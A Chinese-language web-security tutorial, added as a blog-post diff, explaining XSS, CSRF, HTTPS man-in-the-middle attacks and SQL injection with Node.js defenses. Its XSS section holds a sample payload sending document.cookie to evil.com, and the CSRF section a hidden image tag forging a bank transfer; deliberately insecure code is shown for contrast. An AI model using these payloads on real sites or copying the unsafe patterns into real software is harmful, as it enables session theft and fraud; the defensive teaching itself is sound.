@@ -1,0 +1,335 @@
+---
+title: "Web 安全入门：XSS、CSRF、HTTPS 一篇讲透，保护你的用户不被攻击"
+description: "由浅入深讲解 Web 安全的三大核心威胁：XSS（跨站脚本攻击）、CSRF（跨站请求伪造）、HTTPS 中间人攻击的原理与防御方案，配合可运行的 Node.js 代码演示攻击与防御，附一份 Web 安全避坑清单。"
+category: tech
+tags: ["Web安全", "XSS", "CSRF", "HTTPS", "前端安全", "后端安全"]
+date: 2026-07-02
+draft: false
+cover: "https://images.unsplash.com/photo-1449182325215-d517de72c42d?w=1200&h=630&fit=crop"
+---
+
+你写的 Web 应用上线了，用户开始注册、登录、发帖。一切看起来不错，直到有一天你发现数据库里多了几百条「<script>alert('xss')</script>」之类的垃圾数据，或者有用户投诉说自己「莫名其妙发了条广告」。
+
+你不是一个人。Web 安全不是「大公司才需要关心的事」——大多数攻击都是自动化的脚本在扫全网，你的网站只要有一个漏洞就会被命中。这篇文章不讲高深的密码学，只聚焦 Web 开发者最常遇到的三个安全威胁：**XSS、CSRF、HTTPS 中间人攻击**，用可运行的代码演示它们怎么工作、怎么防御。
+
+## 第一章：XSS — 跨站脚本攻击
+
+### 攻击原理
+
+XSS（Cross-Site Scripting）的核心是：**攻击者把恶意脚本注入到你的网页里，让它在其他用户的浏览器里执行**。
+
+最简单的例子——一个评论区：
+
+```javascript
+// ❌ 不安全的做法：直接把用户输入插入页面
+app.get('/comments', (req, res) => {
+  const comments = db.getComments();
+  res.send(`
+    <html>
+      <body>
+        <h1>评论区</h1>
+        ${comments.map(c => `<div>${c.content}</div>`).join('')}
+      </body>
+    </html>
+  `);
+});
+```
+
+如果某个用户提交了这样的评论：
+
+```html
+<script>
+  fetch('https://evil.com/steal?cookie=' + document.cookie)
+</script>
+```
+
+那么**每个浏览这个页面的用户**，cookie 都会被发送到攻击者的服务器。这就是**存储型 XSS**——恶意代码被存在服务器上，每次有人访问就执行一次。
+
+### XSS 的三种类型
+
+| 类型 | 恶意代码在哪 | 危害 |
+|------|-------------|------|
+| **存储型** | 存在服务器数据库里 | 所有访问该页面的用户都受害（最严重） |
+| **反射型** | 在 URL 参数里 | 需要诱导用户点击恶意链接 |
+| **DOM 型** | 在客户端 JS 动态生成的 DOM 里 | 纯前端漏洞，服务端不一定知道 |
+
+### 防御 XSS 的核心手段
+
+**1. 输出编码（最基础也最重要）**
+
+永远不要直接把用户输入当 HTML 插入。用转义函数：
+
+```javascript
+function escapeHtml(unsafe) {
+  return unsafe
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+// ✅ 安全做法
+app.get('/comments', (req, res) => {
+  const comments = db.getComments();
+  res.send(`
+    <html>
+      <body>
+        <h1>评论区</h1>
+        ${comments.map(c => `<div>${escapeHtml(c.content)}</div>`).join('')}
+      </body>
+    </html>
+  `);
+});
+```
+
+现在 `<script>` 变成了 `&lt;script&gt;`，浏览器会把它显示为普通文本，不会执行。
+
+**2. 使用 Content-Security-Policy（CSP）**
+
+CSP 是 HTTP 响应头，告诉浏览器「只允许从这些来源加载脚本」：
+
+```javascript
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self' https://trusted-cdn.com;"
+  );
+  next();
+});
+```
+
+即使攻击者注入了 `<script src="https://evil.com/hack.js"></script>`，浏览器也会因为 CSP 策略阻止它加载。
+
+**3. 设置 HttpOnly Cookie**
+
+如果 cookie 设置了 `HttpOnly`，JavaScript 就读取不到它（`document.cookie` 不会包含这个 cookie）：
+
+```javascript
+res.cookie('session', token, {
+  httpOnly: true,  // JS 无法读取
+  secure: true,    // 仅 HTTPS 传输
+  sameSite: 'lax', // 防止 CSRF（下一章）
+});
+```
+
+这样即使攻击者注入了 XSS 脚本，`document.cookie` 也拿不到 session cookie——cookie 被盗的风险大大降低。
+
+## 第二章：CSRF — 跨站请求伪造
+
+### 攻击原理
+
+CSRF（Cross-Site Request Forgery）的核心是：**攻击者诱导已登录的用户点击链接或提交表单，在用户不知情的情况下以用户的身份执行操作**。
+
+想象你登录了银行网站 `bank.com`，然后收到了攻击者发来的钓鱼邮件，邮件里有个隐藏的图片：
+
+```html
+<!-- 看起来是一张图片，实际上是个转账请求 -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0" height="0" />
+```
+
+因为你已经登录了 `bank.com`，浏览器会自动带上你的 session cookie。服务端收到请求时，它看起来就是「你」发起的转账。
+
+### CSRF vs XSS 的区别
+
+```
+XSS  = 攻击者在你的页面里运行脚本
+CSRF = 攻击者诱导你的浏览器发请求
+```
+
+XSS 能绕开 CSRF 防御（因为脚本在页面内执行），所以防御 XSS 也能防御 CSRF。但即使没有 XSS，CSRF 依然可能发生。
+
+### 防御 CSRF 的三种方案
+
+**方案一：SameSite Cookie（最简单）**
+
+设置 cookie 的 `SameSite` 属性，告诉浏览器「跨站请求不要带这个 cookie」：
+
+```javascript
+res.cookie('session', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'lax',    // 默认，GET 请求可以带 cookie，POST 不行
+  // sameSite: 'strict', // 更严格，所有跨站请求都不带 cookie
+});
+```
+
+`SameSite: 'lax'` 已经是现代浏览器的默认行为，能防御绝大多数 CSRF 攻击。
+
+**方案二：CSRF Token（传统方案）**
+
+服务端生成一个随机 token 嵌入到表单里，提交时验证：
+
+```javascript
+// 服务端：生成 token 并嵌入表单
+const csrfToken = crypto.randomBytes(32).toString('hex');
+session.csrfToken = csrfToken;
+
+res.send(`
+  <form action="/transfer" method="POST">
+    <input type="hidden" name="_csrf" value="${csrfToken}" />
+    <input type="text" name="to" />
+    <input type="number" name="amount" />
+    <button>转账</button>
+  </form>
+`);
+
+// 服务端：验证 token
+app.post('/transfer', (req, res) => {
+  if (req.body._csrf !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'CSRF 验证失败' });
+  }
+  // 执行转账...
+});
+```
+
+攻击者的页面无法知道你的 CSRF token，所以伪造的表单提交会被拒绝。
+
+**方案三：验证 Referer/Origin 头**
+
+检查请求头里的 `Referer` 或 `Origin`，确保请求来自你自己的网站：
+
+```javascript
+app.post('/transfer', (req, res) => {
+  const origin = req.get('Origin') || req.get('Referer');
+  if (!origin || !origin.startsWith('https://bank.com')) {
+    return res.status(403).json({ error: '非法来源' });
+  }
+  // 执行转账...
+});
+```
+
+## 第三章：HTTPS 与中间人攻击
+
+### 攻击原理
+
+如果你只用 HTTP，用户和服务器之间的通信是明文传输的。攻击者可以在中间（比如公共 WiFi 热点）监听甚至篡改数据：
+
+```
+用户 ── HTTP ──> [攻击者] ── HTTP ──> 服务器
+                ↑
+            监听和篡改一切数据
+```
+
+这就是**中间人攻击（MITM）**。攻击者能看到你的密码、信用卡号，甚至能把页面里的「转账到 Alice」改成「转账到 Eve」。
+
+HTTPS 通过 **TLS 加密** 解决这个问题：
+
+```
+用户 ── HTTPS (加密) ──> 服务器
+       ↑ 无法监听也无法篡改
+```
+
+### 用 Node.js 配置 HTTPS
+
+```javascript
+import https from 'https';
+import fs from 'fs';
+import express from 'express';
+
+const app = express();
+
+// 需要证书文件（正式环境从 Let's Encrypt 获取）
+const options = {
+  key: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/privkey.pem'),
+  cert: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/fullchain.pem'),
+};
+
+https.createServer(options, app).listen(443, () => {
+  console.log('HTTPS server running on :443');
+});
+
+// 把 HTTP 请求重定向到 HTTPS
+app.use((req, res, next) => {
+  if (!req.secure) {
+    return res.redirect(`https://${req.hostname}${req.originalUrl}`);
+  }
+  next();
+});
+```
+
+### HSTS——强制使用 HTTPS
+
+即使配置了 HTTPS，如果用户不小心输入了 `http://` 而不是 `https://`，第一次请求依然是明文。HSTS 告诉浏览器「以后永远用 HTTPS 访问这个网站」：
+
+```javascript
+app.use((req, res, next) => {
+  res.setHeader(
+    'Strict-Transport-Security',
+    'max-age=31536000; includeSubDomains; preload'
+  );
+  next();
+});
+```
+
+设置后，浏览器会把你的网站加入 HSTS 列表，下次访问时自动使用 HTTPS。
+
+## 第四章：其他必须知道的安全措施
+
+### SQL 注入
+
+```javascript
+// ❌ 危险：拼接 SQL
+const sql = `SELECT * FROM users WHERE name = '${userInput}'`;
+
+// ✅ 安全：参数化查询
+const result = await db.query('SELECT * FROM users WHERE name = $1', [userInput]);
+```
+
+### 速率限制（Rate Limiting）
+
+防止暴力破解密码和接口滥用：
+
+```javascript
+import rateLimit from 'express-rate-limit';
+
+// 登录接口：每 IP 每分钟最多 5 次尝试
+app.use('/api/login', rateLimit({
+  windowMs: 60 * 1000,
+  max: 5,
+  message: { error: '尝试次数过多，请 1 分钟后再试' },
+}));
+```
+
+### 安全响应头
+
+```javascript
+import helmet from 'helmet';
+app.use(helmet());   // 一行代码设置十几个安全相关的 HTTP 头
+```
+
+Helmet 会自动设置：
+
+| 响应头 | 作用 |
+|--------|------|
+| `X-Content-Type-Options: nosniff` | 防止 MIME 类型嗅探 |
+| `X-Frame-Options: DENY` | 防止点击劫持（页面被嵌入 iframe） |
+| `X-XSS-Protection: 0` | 现代浏览器不再需要，但兼容旧浏览器 |
+| `Referrer-Policy: strict-origin-when-cross-origin` | 控制 Referer 头携带的信息量 |
+
+## 避坑清单
+
+| 坑 | 正确做法 |
+|----|---------|
+| 把用户输入直接插入 HTML | 始终做输出编码：`escapeHtml`、模板引擎自动转义、React 的 `{}` 插值 |
+| 不用 CSP | 加 `Content-Security-Policy` 头作为深度防御 |
+| 不设 HttpOnly Cookie | 所有 session cookie 设 `httpOnly: true` 和 `secure: true` |
+| 不加 `SameSite` | 现代浏览器默认 `lax` 了，但显式设置更靠谱 |
+| 不验证 CSRF Token | 用 `SameSite` + Token 双重保险 |
+| HTTP 不重定向到 HTTPS | 加重定向 + HSTS + 证书自动续期（Let's Encrypt） |
+| 拼接 SQL | 永远用参数化查询或 ORM |
+| 不设登录限流 | 关键接口（登录、注册、密码重置）必须限流 |
+| 密码存明文 | 用 bcrypt 加盐哈希，不要自己写哈希算法 |
+| 暴露太多错误信息 | 500 错误不要直接抛数据库错误给用户 |
+| 不上报安全异常 | 记录异常登录、可疑请求，及时发现攻击 |
+
+## 小结
+
+Web 安全不是「做一次就好」的事。它是在开发过程中持续养成的习惯：**每次写 `<input>` 时想一下 XSS，每次写表单时想一下 CSRF，每次上线前确认 HTTPS 和响应头都配好了**。
+
+好消息是，绝大多数防御措施都是一次配置、长期受益的：
+- Helmet + CSP 一次性配好，XSS 防护就覆盖了大部分场景
+- SameSite Cookie 一行代码，CSRF 风险就大幅降低
+- HTTPS + HSTS 配一次，中间人攻击就基本不可能了
+
+做到这些，你的网站就已经比互联网上 90% 的应用安全了。
